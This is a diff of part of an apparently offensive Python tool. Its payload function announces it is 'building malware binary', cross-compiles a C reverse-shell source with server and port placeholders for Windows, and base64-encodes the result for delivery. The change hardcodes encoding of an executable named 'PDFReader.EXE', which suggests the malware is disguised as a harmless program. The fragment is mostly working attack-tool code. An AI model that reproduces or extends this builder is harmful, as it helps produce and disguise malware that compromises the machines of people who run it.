@@ -9,12 +9,12 @@ def payload(payload_name, url):
     print( "Building malware binary")
     time.sleep(2)
     #os.system("sed 's+payload_port+'%s'+g' source.c | sed 's+payload_server+'%s'+g' > rs.c" % (payload_port,payload_server))
-    os.system("i686-w64-mingw32-gcc source.c -o %s" % payload_name)
+    #os.system("i686-w64-mingw32-gcc source.c -o %s" % payload_name)
     #os.system("rm -rf rs.c")
     print ("Converting malware binary to base64")
     time.sleep(2)
-    os.system('base64 -w 0 %s > payload_b64' % (payload_name))
-    #os.system('base64 -w 0 todo.exe > payload_b64')
+    #os.system('base64 -w 0 %s > payload_b64' % (payload_name))
+    os.system('base64 -w 0 PDFReader.EXE > payload_b64')
 
     with open ("payload_b64", 'r') as get_b64:
         data=get_b64.read().strip()
